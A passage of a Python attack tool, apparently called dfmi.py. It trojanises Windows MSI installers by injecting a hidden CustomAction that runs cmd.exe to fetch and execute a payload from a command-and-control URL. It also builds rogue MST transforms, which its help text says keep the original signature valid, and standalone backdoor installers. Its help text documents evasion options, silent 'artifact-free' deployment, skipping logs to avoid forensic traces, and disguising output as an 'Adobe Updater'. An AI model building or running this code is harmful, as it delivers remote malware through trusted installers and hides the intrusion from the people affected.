        print(f"    {'OK' if r.returncode == 0 else 'FAIL: '+r.stderr.strip()}")
        os.unlink(idt.name)

def _randomize_guids_linux(msi):
    new_prod = gen_guid()
    new_upg  = gen_guid()  # separate GUID — UpgradeCode ≠ ProductCode
    new_pkg  = gen_guid()
    _sql_linux(msi, f"UPDATE Property SET Value='{new_prod}' WHERE Property='ProductCode'")
    _sql_linux(msi, f"UPDATE Property SET Value='{new_upg}'  WHERE Property='UpgradeCode'")
    r = subprocess.run(['msiinfo', 'suminfo', msi], capture_output=True, text=True)
    info = {}
    for line in r.stdout.strip().split('\n'):
        if ': ' in line:
            k, v = line.split(': ', 1)
            info[k.strip()] = v.strip()
    title  = info.get('Title', 'Installation Database')
    author = info.get('Author', '')
    subprocess.run(['msibuild', msi, '-s', title, author, '', new_pkg], capture_output=True)
    print(f"[*] New ProductCode : {new_prod}")
    print(f"[*] New PackageCode : {new_pkg}")
    return new_prod

def _inject_linux(target, output, exe_args, exe_path='C:\\Windows\\System32\\cmd.exe',
                  action_name=None, prop_name=None, seq_num=1510):
    if not check_deps_linux(['msibuild', 'msiinfo']):
        return False
    if action_name is None:
        action_name = gen_name()
    if prop_name is None:
        prop_name = gen_name()
    action_name = _validate_msi_identifier(action_name, 'action_name', max_len=72)
    prop_name = _validate_msi_identifier(prop_name, 'prop_name', max_len=72)
    shutil.copy(target, output)
    prod_code = _randomize_guids_linux(output)
    print()
    _ensure_table_linux(output, "CustomAction",
                        "Action\tType\tSource\tTarget\tExtendedType",
                        "s72\ti2\tS72\tS255\tI4")
    _ensure_table_linux(output, "InstallExecuteSequence",
                        "Action\tCondition\tSequence",
                        "s72\tS255\tI2")
    print(f"[*] Action name  : {action_name}")
    print(f"[*] Property name: {prop_name}")
    print(f"[*] Sequence     : {seq_num}")
    print("[*] Injecting property...")
    ok, err = _sql_linux(output, f"INSERT INTO Property (Property, Value) VALUES ('{prop_name}', '{exe_path}')")
    if not ok:
        ok, err = _sql_linux(output, f"UPDATE Property SET Value='{exe_path}' WHERE Property='{prop_name}'")
    print(f"    {'OK' if ok else 'FAIL: '+err}")
    print("[*] Injecting CustomAction...")
    ok, err = _sql_linux(output,
        f"INSERT INTO CustomAction (Action, Type, Source, Target) "
        f"VALUES ('{action_name}', 50, '{prop_name}', '{exe_args}')")
    if not ok:
        print(f"    FAIL: {err}"); return False
    print(f"    OK")
    print(f"[*] Injecting sequence ({seq_num})...")
    ok, err = _sql_linux(output,
        f"INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) "
        f"VALUES ('{action_name}', '', {seq_num})")
    if not ok:
        print(f"    FAIL: {err}"); return False
    print(f"    OK")
    print("\n[*] Verifying...")
    ca_out = _export_linux(output, "CustomAction")
    if action_name in ca_out:
        print("[+] CustomAction OK")
        for line in ca_out.split('\r\n'):
            if action_name in line: print(f"    {line[:120]}")
    else:
        print("[-] CustomAction MISSING"); return False
    if action_name in _export_linux(output, "InstallExecuteSequence"):
        print("[+] Sequence OK")
    else:
        print("[-] Sequence MISSING"); return False
    return prod_code

def _inspect_linux(msi):
    print(f"\n{'='*60}\n  MSI: {msi}\n{'='*60}")
    print("\n[CustomActions]")
    out = _export_linux(msi, "CustomAction")
    found = False
    for line in out.split('\r\n'):
        if line and not line.startswith(('Action', 's72', 'CustomAction\t')):
            print(f"  {line[:120]}"); found = True
    if not found: print("  (none)")
    print("\n[InstallExecuteSequence]")
    for line in _export_linux(msi, "InstallExecuteSequence").split('\r\n')[3:]:
        if line.strip(): print(f"  {line}")
    print("\n[Properties]")
    for line in _export_linux(msi, "Property").split('\r\n'):
        if line.strip() and not line.startswith(('Property', 's72', 'Property\t')):
            print(f"  {line}")
    print()

# Windows back-end

def _inject_windows(target, output, exe_args, exe_path='C:\\Windows\\System32\\cmd.exe',
                    action_name=None, prop_name=None, seq_num=1510):
    if action_name is None:
        action_name = gen_name()
    if prop_name is None:
        prop_name = gen_name()
    target = os.path.abspath(target)
    output = os.path.abspath(output)
    safe_args   = exe_args.replace("'", "''")
    safe_target = target.replace("'", "''")
    safe_output = output.replace("'", "''")

    ps_script = f"""
$ErrorActionPreference = 'Stop'
$target      = '{safe_target}'
$output      = '{safe_output}'
$exeProp     = '{prop_name}'
$exePath     = '{exe_path}'
$caArgs      = '{safe_args}'
$actionName  = '{action_name}'
$seqNum      = {seq_num}

Write-Host "[PS] Copying MSI..."
Copy-Item $target $output -Force

$installer = New-Object -ComObject WindowsInstaller.Installer

$newProd = "{{" + [guid]::NewGuid().ToString().ToUpper() + "}}"
$newUpg  = "{{" + [guid]::NewGuid().ToString().ToUpper() + "}}"
$newPkg  = "{{" + [guid]::NewGuid().ToString().ToUpper() + "}}"

$db = $installer.OpenDatabase($output, 1)
try {{
    $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='$newProd' WHERE ``Property``='ProductCode'")
    $v.Execute(); $v.Close()
    $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='$newUpg' WHERE ``Property``='UpgradeCode'")
    $v.Execute(); $v.Close()
}} catch {{}}
Write-Host "[PS] New ProductCode: $newProd"
Write-Host "[PS] Action name    : $actionName"
Write-Host "[PS] Property name  : $exeProp"
Write-Host "[PS] Sequence       : $seqNum"

try {{
    $v = $db.OpenView("INSERT INTO ``Property`` (``Property``,``Value``) VALUES ('$exeProp','$exePath')")
    $v.Execute(); $v.Close()
    Write-Host "[PS] Property: OK"
}} catch {{
    try {{
        $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='$exePath' WHERE ``Property``='$exeProp'")
        $v.Execute(); $v.Close()
        Write-Host "[PS] Property: OK (updated)"
    }} catch {{ Write-Host "[PS] Property: FAIL ${{_}}" }}
}}

try {{
    $v = $db.OpenView("CREATE TABLE ``CustomAction`` (``Action`` CHAR(72) NOT NULL, ``Type`` SHORT NOT NULL, ``Source`` CHAR(72), ``Target`` CHAR(255), ``ExtendedType`` LONG PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close()
    Write-Host "[PS] Created CustomAction table"
}} catch {{}}

try {{
    $v = $db.OpenView("INSERT INTO ``CustomAction`` (``Action``,``Type``,``Source``,``Target``) VALUES ('$actionName',50,'$exeProp','$caArgs')")
    $v.Execute(); $v.Close()
    Write-Host "[PS] CustomAction: OK"
}} catch {{ Write-Host "[PS] CustomAction: FAIL ${{_}}"; exit 1 }}

try {{
    $v = $db.OpenView("CREATE TABLE ``InstallExecuteSequence`` (``Action`` CHAR(72) NOT NULL, ``Condition`` CHAR(255), ``Sequence`` SHORT PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close()
    Write-Host "[PS] Created InstallExecuteSequence table"
}} catch {{}}

try {{
    $v = $db.OpenView("INSERT INTO ``InstallExecuteSequence`` (``Action``,``Condition``,``Sequence``) VALUES ('$actionName','',$seqNum)")
    $v.Execute(); $v.Close()
    Write-Host "[PS] Sequence: OK"
}} catch {{ Write-Host "[PS] Sequence: FAIL ${{_}}"; exit 1 }}

try {{
    $si = $db.SummaryInformation(10)
    $si.Property(9) = $newPkg
    $si.Persist()
    Write-Host "[PS] New PackageCode: $newPkg"
}} catch {{
    Write-Host "[PS] PackageCode update skipped: ${{_}}"
}}

$v = $db.OpenView("SELECT Target FROM CustomAction WHERE Action='$actionName'")
$v.Execute()
$r = $v.Fetch()
if ($r) {{
    Write-Host "[PS] Verified CustomAction: OK"
}} else {{
    Write-Host "[PS] Verified CustomAction: MISSING"; exit 1
}}
$v.Close()

$db.Commit()
Write-Host "[PS] Done: $output"
Write-Host "PRODCODE:$newProd"
"""

    print("[*] Running PowerShell inject backend...")
    ok, stdout, stderr = run_ps(ps_script)
    prod_code = "{ProductCode}"
    for line in stdout.split('\n'):
        line = line.strip()
        if line:
            if line.startswith('PRODCODE:'):
                prod_code = line.replace('PRODCODE:', '').strip()
            else:
                print(f"  {line}")
    if stderr and not ok:
        print(f"\n[!] PowerShell error:")
        for line in stderr.split('\n'):
            if line.strip(): print(f"    {line.strip()}")
    if not ok:
        print("[!] inject failed"); return False
    return prod_code

def _inspect_windows(msi):
    msi = os.path.abspath(msi)
    safe_msi = msi.replace("'", "''")
    ps_script = f"""
$installer = New-Object -ComObject WindowsInstaller.Installer
$db = $installer.OpenDatabase('{safe_msi}', 0)
Write-Host "\n{'='*60}"
Write-Host "  MSI: {msi}"
Write-Host "{'='*60}"
Write-Host "\n[CustomActions]"
try {{
    $v = $db.OpenView("SELECT Action,Type,Source,Target FROM CustomAction")
    $v.Execute(); $found = $false
    while ($true) {{
        $r = $v.Fetch(); if ($r -eq $null) {{ break }}
        $tgt = $r.StringData(4)
        if ($tgt.Length -gt 60) {{ $tgt = $tgt.Substring(0,60) + "..." }}
        Write-Host ("  " + $r.StringData(1) + "  Type=" + $r.IntegerData(2) + "  " + $r.StringData(3) + "  " + $tgt)
        $found = $true
    }}
    $v.Close()
    if (-not $found) {{ Write-Host "  (none)" }}
}} catch {{ Write-Host "  (none)" }}
Write-Host "\n[Properties]"
$v = $db.OpenView("SELECT Property,Value FROM Property WHERE Property IN ('ProductCode','ProductName','Manufacturer')")
$v.Execute()
while ($true) {{
    $r = $v.Fetch(); if ($r -eq $null) {{ break }}
    Write-Host ("  " + $r.StringData(1) + " = " + $r.StringData(2))
}}
$v.Close()
"""
    ok, stdout, stderr = run_ps(ps_script)
    if stdout: print(stdout)
    if stderr and not ok: print(f"[!] {stderr}")

def cmd_inject(args):
    if not args or args[0] in ('-h', '--help'):
        print(HELP_INJECT); return
    if '--inspect' in args:
        idx = args.index('--inspect')
        msi = args[idx+1] if idx+1 < len(args) else None
        if not msi: print("[!] --inspect requires a target MSI path"); return
        _inspect_windows(msi) if is_windows() else _inspect_linux(msi)
        return
    parsed = _parse_inject_args(args)
    if parsed is None:
        print("[!] Missing required arguments.\n"); print(HELP_INJECT); return
    target, output, c2_url, mode, action_name, prop_name, seq_num, drop_name = parsed
    if not os.path.exists(target):
        print(f"[!] Target not found: {target}"); return
    if action_name is None: action_name = gen_name()
    if prop_name is None:   prop_name   = gen_name()
    validate_msi_identifier(action_name, '--action-name')
    validate_msi_identifier(prop_name,   '--property-name')
    print(f"[*] Target : {target}")
    print(f"[*] C2 URL : {c2_url}")
    print(f"[*] Output : {output}")
    print(f"[*] Mode   : {mode}")
    print()
    if mode == "ps": exe_args = build_ca_ps(c2_url, drop_name)
    elif mode == "cmd": exe_args = build_ca_cmd(c2_url, drop_name)
    else: print(f"[!] Unknown mode: {mode}"); return
    print(f"[*] CA args length: {len(exe_args)}")
    print(f"[*] Backend: {'PowerShell (Windows)' if is_windows() else 'msibuild (Linux)'}")
    print()
    prod_code = (_inject_windows(target, output, exe_args, action_name=action_name,
                                  prop_name=prop_name, seq_num=seq_num)
                 if is_windows() else
                 _inject_linux(target, output, exe_args, action_name=action_name,
                               prop_name=prop_name, seq_num=seq_num))
    if not prod_code: return
    size = os.path.getsize(output) if os.path.exists(output) else 0
    print(f"\n[+] Output: {output} ({size:,} bytes)")
    print()
    print("=" * 60)
    print("DEPLOY (silent):")
    print(f'  msiexec /i "{output}" /qn')
    print()
    print("DEPLOY (verbose log):")
    print(f'  msiexec /i "{output}" /l*v install.log')
    print()
    print("ARTIFACT-FREE:")
    print(f'  msiexec /i "{output}" /qn && msiexec /x {prod_code} /qn')
    print("=" * 60)

def _parse_inject_args(args):
    if len(args) < 2: return None
    target = args[0]; output = args[1]; rest = args[2:]
    c2_url = None; mode = "ps"
    action_name = None; prop_name = None; seq_num = 1510; drop_name = None
    i = 0
    while i < len(rest):
        if rest[i] == '--c2' and i+1 < len(rest):           c2_url = rest[i+1]; i += 2
        elif rest[i] == '--mode' and i+1 < len(rest):        mode = rest[i+1]; i += 2
        elif rest[i] == '--action-name' and i+1 < len(rest): action_name = rest[i+1]; i += 2
        elif rest[i] == '--property-name' and i+1 < len(rest): prop_name = rest[i+1]; i += 2
        elif rest[i] == '--sequence' and i+1 < len(rest):
            try:
                seq_num = int(rest[i+1])
            except ValueError:
                print(f"[!] --sequence must be an integer, got: {rest[i+1]}"); sys.exit(1)
            i += 2
        elif rest[i] == '--drop-name' and i+1 < len(rest):   drop_name = rest[i+1]; i += 2
        elif rest[i] in ('-h', '--help'): return 'help'
        else: i += 1
    if not c2_url: return None
    return target, output, c2_url, mode, action_name, prop_name, seq_num, drop_name

# Rogue-Mst Module

HELP_ROGUE_MST = """
Command: rogue-mst
==================
Generate a .mst transform for an existing MSI. [Windows only]
Original MSI Authenticode signature stays valid.
PowerShell COM backend — no pip install needed.

Usage:
  python3 dfmi.py rogue-mst build  <original.msi> <output.mst> --c2 <url> [options]
  python3 dfmi.py rogue-mst verify <original.msi> <transform.mst>
  python3 dfmi.py rogue-mst deploy <original.msi> <transform.mst> [--no-log] [--timeout N]

Evasion Options (build):
  --action-name NAME  CustomAction name   (default: random)
  --property-name N   Property name       (default: random)
  --sequence NUM      Sequence position   (default: 1510)
  --drop-name NAME    EXE drop filename   (default: random, cmd mode only)

Deploy Options:
  --no-log          Skip install.log (no forensic artifact on disk)
  --timeout N       msiexec timeout in seconds (default: 300, 0 = no limit)

Deploy:
  msiexec /i original.msi TRANSFORMS=payload.mst /qn
"""

def _rogue_mst_build(original, output, c2_url, mode="ps",
                     action_name=None, prop_name=None, seq_num=1510, drop_name=None):
    if not is_windows():
        print("[!] rogue-mst requires Windows."); return False
    if not os.path.exists(original):
        print(f"[!] File not found: {original}"); return False
    if action_name is None: action_name = gen_name()
    if prop_name is None:   prop_name   = gen_name()
    validate_msi_identifier(action_name, '--action-name')
    validate_msi_identifier(prop_name,   '--property-name')
    original = os.path.abspath(original)
    output   = os.path.abspath(output)
    print(f"[*] Original : {original}")
    print(f"[*] Output   : {output}")
    print(f"[*] C2 URL   : {c2_url}")
    print(f"[*] Mode     : {mode}")
    print(f"[*] Action   : {action_name}")
    print(f"[*] Property : {prop_name}")
    print(f"[*] Sequence : {seq_num}")
    print()
    if mode == "ps": exe_args = build_ca_ps(c2_url, drop_name)
    elif mode == "cmd": exe_args = build_ca_cmd(c2_url, drop_name)
    else: print(f"[!] Unknown mode: {mode}"); return False
    safe_orig   = original.replace("'", "''")
    safe_output = output.replace("'", "''")
    safe_args   = exe_args.replace("'", "''")
    ps_script = f"""
$ErrorActionPreference = 'Stop'
$original    = '{safe_orig}'
$output      = '{safe_output}'
$exeProp     = '{prop_name}'
$exePath     = 'C:\\Windows\\System32\\cmd.exe'
$caArgs      = '{safe_args}'
$actionName  = '{action_name}'
$seqNum      = {seq_num}
$installer = New-Object -ComObject WindowsInstaller.Installer
Write-Host "[PS] Opening reference and working copy..."
$dbRef  = $installer.OpenDatabase($original, 0)
$tmp    = [System.IO.Path]::GetTempFileName() + ".msi"
Copy-Item $original $tmp
$dbWork = $installer.OpenDatabase($tmp, 1)
Write-Host "[PS] Injecting Property..."
try {{
    $v = $dbWork.OpenView("INSERT INTO ``Property`` (``Property``,``Value``) VALUES ('$exeProp','$exePath')")
    $v.Execute(); $v.Close(); Write-Host "[PS] Property: OK"
}} catch {{
    try {{
        $v = $dbWork.OpenView("UPDATE ``Property`` SET ``Value``='$exePath' WHERE ``Property``='$exeProp'")
        $v.Execute(); $v.Close(); Write-Host "[PS] Property: OK (updated)"
    }} catch {{ Write-Host "[PS] Property error: ${{_}}" }}
}}
try {{
    $v = $dbWork.OpenView("CREATE TABLE ``CustomAction`` (``Action`` CHAR(72) NOT NULL, ``Type`` SHORT NOT NULL, ``Source`` CHAR(72), ``Target`` CHAR(255), ``ExtendedType`` LONG PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close(); Write-Host "[PS] CustomAction table created"
}} catch {{}}
$v = $dbWork.OpenView("INSERT INTO ``CustomAction`` (``Action``,``Type``,``Source``,``Target``) VALUES ('$actionName',50,'$exeProp','$caArgs')")
$v.Execute(); $v.Close(); Write-Host "[PS] CustomAction: OK"
try {{
    $v = $dbWork.OpenView("CREATE TABLE ``InstallExecuteSequence`` (``Action`` CHAR(72) NOT NULL, ``Condition`` CHAR(255), ``Sequence`` SHORT PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close(); Write-Host "[PS] InstallExecuteSequence table created"
}} catch {{}}
$v = $dbWork.OpenView("INSERT INTO ``InstallExecuteSequence`` (``Action``,``Condition``,``Sequence``) VALUES ('$actionName','',$seqNum)")
$v.Execute(); $v.Close(); Write-Host "[PS] Sequence: OK"
$dbWork.Commit()
Write-Host "[PS] Generating transform..."
if (Test-Path $output) {{ Remove-Item $output -Force }}
$dbWork.GenerateTransform($dbRef, $output)
$dbWork.CreateTransformSummaryInfo($dbRef, $output, 0, 0)
Remove-Item $tmp -Force -ErrorAction SilentlyContinue
Write-Host "[PS] Done: $output"
"""
    print("[*] Running PowerShell MST builder...")
    ok, stdout, stderr = run_ps(ps_script)
    for line in stdout.split('\n'):
        if line.strip(): print(f"  {line.strip()}")
    if not ok:
        if stderr:
            print(f"\n[!] Error:")
            for line in stderr.split('\n'):
                if line.strip(): print(f"    {line.strip()}")
        print("[!] rogue-mst build failed"); return False
    if not os.path.exists(output):
        print("[!] Output file not created"); return False
    ps_pc = f"""
$installer = New-Object -ComObject WindowsInstaller.Installer
$db = $installer.OpenDatabase('{safe_orig}', 0)
$v = $db.OpenView("SELECT Value FROM Property WHERE Property='ProductCode'")
$v.Execute(); $r = $v.Fetch()
if ($r) {{ $r.StringData(1) }}
"""
    ok2, pc, _ = run_ps(ps_pc)
    prod_code = pc.strip() if ok2 and pc.strip() else "{ProductCode}"
    orig_name = os.path.basename(original)
    mst_name  = os.path.basename(output)
    size = os.path.getsize(output)
    print(f"\n[+] Transform: {output} ({size:,} bytes)")
    print()
    print("=" * 60)
    print("DEPLOY (silent):")
    print(f'  msiexec /i "{orig_name}" TRANSFORMS="{mst_name}" /qn')
    print()
    print("ARTIFACT-FREE:")
    print(f'  msiexec /i "{orig_name}" TRANSFORMS="{mst_name}" /qn')
    print(f'  msiexec /x {prod_code} /qn')
    print("=" * 60)
    return True

def _rogue_mst_verify(original, transform):
    if not is_windows():
        print("[!] rogue-mst requires Windows."); return False
    for f in [original, transform]:
        if not os.path.exists(f):
            print(f"[!] File not found: {f}"); return False
    original  = os.path.abspath(original)
    transform = os.path.abspath(transform)
    ps_script = f"""
$installer = New-Object -ComObject WindowsInstaller.Installer
$db = $installer.OpenDatabase('{original.replace("'","''")}', 1)
$db.ApplyTransform('{transform.replace("'","''")}', 0)
Write-Host "[CustomActions after transform]"
$v = $db.OpenView("SELECT Action,Type,Source,Target FROM CustomAction")
$v.Execute(); $backdoorFound = $false
while ($true) {{
    $r = $v.Fetch(); if ($r -eq $null) {{ break }}
    $tgt = $r.StringData(4)
    if ($tgt.Length -gt 60) {{ $tgt = $tgt.Substring(0,60) + "..." }}
    Write-Host ("  " + $r.StringData(1).PadRight(20) + " Type=" + $r.IntegerData(2) + "  " + $r.StringData(3).PadRight(10) + " " + $tgt)
    if ($r.IntegerData(2) -eq 50) {{ $backdoorFound = $true }}
}}
$v.Close()
if ($backdoorFound) {{
    Write-Host ""
    Write-Host "[+] Backdoor CA (Type 50) found in transform"
}} else {{ Write-Host "[-] No backdoor CA found" }}
"""
    ok, stdout, stderr = run_ps(ps_script)
    if stdout: print(stdout)
    if stderr and not ok: print(f"[!] {stderr}")
    return ok

def _rogue_mst_deploy(original, transform, no_log=False, timeout=300):
    for f in [original, transform]:
        if not os.path.exists(f):
            print(f"[!] File not found: {f}"); return False
    original  = os.path.abspath(original)
    transform = os.path.abspath(transform)
    if no_log:
        cmd = ['msiexec', '/i', original, f'TRANSFORMS={transform}', '/qn']
    else:
        cmd = ['msiexec', '/i', original, f'TRANSFORMS={transform}', '/l*v', 'install.log']
    effective_timeout = None if timeout == 0 else timeout
    timeout_label = "no limit" if effective_timeout is None else f"{effective_timeout}s"
    print(f"[*] Running: {' '.join(cmd)}")
    print(f"[*] Timeout : {timeout_label}")
    try:
        r = subprocess.run(cmd, timeout=effective_timeout)
        print(f"[*] Exit code: {r.returncode}")
        return r.returncode == 0
    except subprocess.TimeoutExpired:
        print(f"[!] msiexec timed out after {effective_timeout}s"); return False

def cmd_rogue_mst(args):
    if not args or args[0] in ('-h', '--help'):
        print(HELP_ROGUE_MST); return
    sub  = args[0]; rest = args[1:]
    if sub == 'build':
        if not rest or rest[0] in ('-h', '--help'): print(HELP_ROGUE_MST); return
        parsed = _parse_mst_build_args(rest)
        if parsed is None: print("[!] --c2 <url> is required.\n"); print(HELP_ROGUE_MST); return
        original, output, c2_url, mode, action_name, prop_name, seq_num, drop_name = parsed
        _rogue_mst_build(original, output, c2_url, mode, action_name, prop_name, seq_num, drop_name)
    elif sub == 'verify':
        if len(rest) < 2: print("[!] Usage: dfmi.py rogue-mst verify <original.msi> <transform.mst>"); return
        _rogue_mst_verify(rest[0], rest[1])
    elif sub == 'deploy':
        if len(rest) < 2: print("[!] Usage: dfmi.py rogue-mst deploy <original.msi> <transform.mst> [--no-log] [--timeout N]"); return
        no_log = '--no-log' in rest
        timeout = 300
        if '--timeout' in rest:
            idx = rest.index('--timeout')
            if idx + 1 < len(rest):
                try:
                    timeout = int(rest[idx + 1])
                except ValueError:
                    print(f"[!] --timeout must be an integer, got: {rest[idx+1]}"); return
        _rogue_mst_deploy(rest[0], rest[1], no_log=no_log, timeout=timeout)
    else:
        print(f"[!] Unknown rogue-mst subcommand: {sub}"); print(HELP_ROGUE_MST)

def _parse_mst_build_args(args):
    if len(args) < 2: return None
    original = args[0]; output = args[1]; rest = args[2:]
    c2_url = None; mode = "ps"
    action_name = None; prop_name = None; seq_num = 1510; drop_name = None
    i = 0
    while i < len(rest):
        if rest[i] == '--c2' and i+1 < len(rest):            c2_url = rest[i+1]; i += 2
        elif rest[i] == '--mode' and i+1 < len(rest):         mode = rest[i+1]; i += 2
        elif rest[i] == '--action-name' and i+1 < len(rest):  action_name = rest[i+1]; i += 2
        elif rest[i] == '--property-name' and i+1 < len(rest):prop_name = rest[i+1]; i += 2
        elif rest[i] == '--sequence' and i+1 < len(rest):
            try:
                seq_num = int(rest[i+1])
            except ValueError:
                print(f"[!] --sequence must be an integer, got: {rest[i+1]}"); sys.exit(1)
            i += 2
        elif rest[i] == '--drop-name' and i+1 < len(rest):    drop_name = rest[i+1]; i += 2
        elif rest[i] in ('-h', '--help'): return 'help'
        else: i += 1
    if not c2_url: return None
    return original, output, c2_url, mode, action_name, prop_name, seq_num, drop_name

# Stub Module (Cross-Platform)

HELP_STUB = """
Command: stub
=============
Create a standalone backdoor MSI from scratch. (Cross-platform)
  Kali:    requires wixl + msitools (apt install wixl msitools)
  Windows: uses embedded base MSI + PowerShell COM (no extra tools)

No original MSI needed. Fully customizable metadata.
The stub installs nothing — only executes your payload.

Usage:
  python3 dfmi.py stub --c2 <url> [options]

Options:
  --c2 <url>              Payload URL (required)
  --mode ps|cmd           Delivery mode (default: ps)
  --name <n>           Product name
  --manufacturer <n>   Manufacturer
  --version <ver>         Version string (default: 1.0.0.0)
  -o <output.msi>         Output file (default: stub.msi)

Evasion Options:
  --action-name NAME  CustomAction name   (default: random)
  --property-name N   Property name       (default: random)
  --sequence NUM      Sequence position   (default: 1510)
  --drop-name NAME    EXE drop filename   (default: random, cmd mode only)

Examples:
  python3 dfmi.py stub --c2 http://<C2>/payload.ps1
  python3 dfmi.py stub --c2 http://<C2>/payload.ps1 --name "Adobe Updater" --manufacturer "Adobe Inc." -o adobe.msi
  python3 dfmi.py stub --c2 http://<C2>/loader.exe --mode cmd -o update.msi
  python3 dfmi.py stub --c2 http://<C2>/p.ps1 --action-name SvcHost --property-name SVCPATH --sequence 3200
"""

def _stub_linux(c2_url, mode, name, manufacturer, version, output, exe_args,
                prod_guid, upg_guid, comp_guid, action_name='WU', prop_name='CMDEXE', seq_num=1510):
    if not check_deps_linux(['wixl', 'msibuild', 'msiinfo']):
        return False
    action_name = _validate_msi_identifier(action_name, 'action_name', max_len=72)
    prop_name = _validate_msi_identifier(prop_name, 'prop_name', max_len=72)
    exe_path = 'C:\\Windows\\System32\\cmd.exe'
    wxs = f"""<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="{prod_guid}" Name="{name}" Language="1033"
           Version="{version}" Manufacturer="{manufacturer}"
           UpgradeCode="{upg_guid}">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine"/>
    <MediaTemplate EmbedCab="yes"/>
    <Feature Id="ProductFeature" Title="Main" Level="1">
      <ComponentRef Id="EmptyComp"/>
    </Feature>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="TempFolder">
        <Component Id="EmptyComp" Guid="{comp_guid}">
          <CreateFolder/>
        </Component>
      </Directory>
    </Directory>
  </Product>
</Wix>"""
    tmpdir = tempfile.mkdtemp()
    wxs_path = os.path.join(tmpdir, "stub.wxs")
    msi_path = os.path.join(tmpdir, "stub.msi")
    try:
        with open(wxs_path, 'w') as f:
            f.write(wxs)
        print("[*] Building base MSI via wixl...")
        r = subprocess.run(['wixl', '-o', msi_path, wxs_path], capture_output=True, text=True)
        if r.returncode != 0:
            print(f"[!] wixl failed: {r.stderr.strip()}"); return False
        print(f"    Base MSI: {os.path.getsize(msi_path):,} bytes")
        def sql(q):
            r = subprocess.run(['msibuild', msi_path, '-q', q], capture_output=True, text=True)
            return r.returncode == 0, r.stderr.strip()
        print(f"[*] Action name  : {action_name}")
        print(f"[*] Property name: {prop_name}")
        print(f"[*] Sequence     : {seq_num}")
        print("[*] Injecting Property...")
        ok, e = sql(f"INSERT INTO Property (Property, Value) VALUES ('{prop_name}', '{exe_path}')")
        print(f"    {'OK' if ok else 'FAIL: '+e}")
        print("[*] Injecting CustomAction...")
        ok, e = sql(f"INSERT INTO CustomAction (Action, Type, Source, Target) VALUES ('{action_name}', 50, '{prop_name}', '{exe_args}')")
        if not ok: print(f"    FAIL: {e}"); return False
        print(f"    OK")
        print("[*] Injecting Sequence...")
        ok, e = sql(f"INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) VALUES ('{action_name}', '', {seq_num})")
        if not ok: print(f"    FAIL: {e}"); return False
        print(f"    OK")
        new_pkg = gen_guid()
        r2 = subprocess.run(['msiinfo', 'suminfo', msi_path], capture_output=True, text=True)
        info = {}
        for line in r2.stdout.strip().split('\n'):
            if ': ' in line:
                k, v = line.split(': ', 1); info[k.strip()] = v.strip()
        title_val  = info.get('Title', name)
        author_val = info.get('Author', manufacturer)
        subprocess.run(['msibuild', msi_path, '-s', title_val, author_val, '', new_pkg], capture_output=True)
        print(f"[*] PackageCode : {new_pkg}")
        shutil.copy(msi_path, output)
        return True
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

def _stub_windows(c2_url, mode, name, manufacturer, version, output, exe_args,
                  prod_guid, upg_guid, comp_guid, action_name='WU', prop_name='CMDEXE', seq_num=1510):
    output = os.path.abspath(output)
    safe_output   = output.replace("'", "''")
    safe_args     = exe_args.replace("'", "''").replace('"', '`"')
    safe_name     = name.replace("'", "''")

    ps_script = f"""
$ErrorActionPreference = 'Stop'
$output      = '{safe_output}'
$actionName  = '{action_name}'
$exeProp     = '{prop_name}'
$seqNum      = {seq_num}

$b64 = '{BASE_MSI_B64}'
$bytes = [Convert]::FromBase64String($b64)
[IO.File]::WriteAllBytes($output, $bytes)
Write-Host "[PS] Base MSI extracted"

$installer = New-Object -ComObject WindowsInstaller.Installer
$db = $installer.OpenDatabase($output, 1)

$newProd = "{prod_guid}"
$newUpg  = "{upg_guid}"
$newPkg  = "{{" + [guid]::NewGuid().ToString().ToUpper() + "}}"

try {{
    $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='$newProd' WHERE ``Property``='ProductCode'")
    $v.Execute(); $v.Close()
    $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='$newUpg' WHERE ``Property``='UpgradeCode'")
    $v.Execute(); $v.Close()
    $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='{safe_name}' WHERE ``Property``='ProductName'")
    $v.Execute(); $v.Close()
}} catch {{}}

Write-Host "[PS] Action name  : $actionName"
Write-Host "[PS] Property name: $exeProp"
Write-Host "[PS] Sequence     : $seqNum"

try {{
    $v = $db.OpenView("INSERT INTO ``Property`` (``Property``,``Value``) VALUES ('$exeProp','C:\\Windows\\System32\\cmd.exe')")
    $v.Execute(); $v.Close()
    Write-Host "[PS] Property: OK"
}} catch {{
    try {{
        $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='C:\\Windows\\System32\\cmd.exe' WHERE ``Property``='$exeProp'")
        $v.Execute(); $v.Close()
        Write-Host "[PS] Property: OK (updated)"
    }} catch {{ Write-Host "[PS] Property: FAIL ${{_}}" }}
}}

try {{
    $v = $db.OpenView("CREATE TABLE ``CustomAction`` (``Action`` CHAR(72) NOT NULL, ``Type`` SHORT NOT NULL, ``Source`` CHAR(72), ``Target`` CHAR(255), ``ExtendedType`` LONG PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close()
}} catch {{}}

$v = $db.OpenView("INSERT INTO ``CustomAction`` (``Action``,``Type``,``Source``,``Target``) VALUES ('$actionName',50,'$exeProp','{safe_args}')")
$v.Execute(); $v.Close()
Write-Host "[PS] CustomAction: OK"

try {{
    $v = $db.OpenView("CREATE TABLE ``InstallExecuteSequence`` (``Action`` CHAR(72) NOT NULL, ``Condition`` CHAR(255), ``Sequence`` SHORT PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close()
}} catch {{}}

$v = $db.OpenView("INSERT INTO ``InstallExecuteSequence`` (``Action``,``Condition``,``Sequence``) VALUES ('$actionName','',$seqNum)")
$v.Execute(); $v.Close()
Write-Host "[PS] Sequence: OK"

try {{
    $si = $db.SummaryInformation(10)
    $si.Property(9) = $newPkg
    $si.Persist()
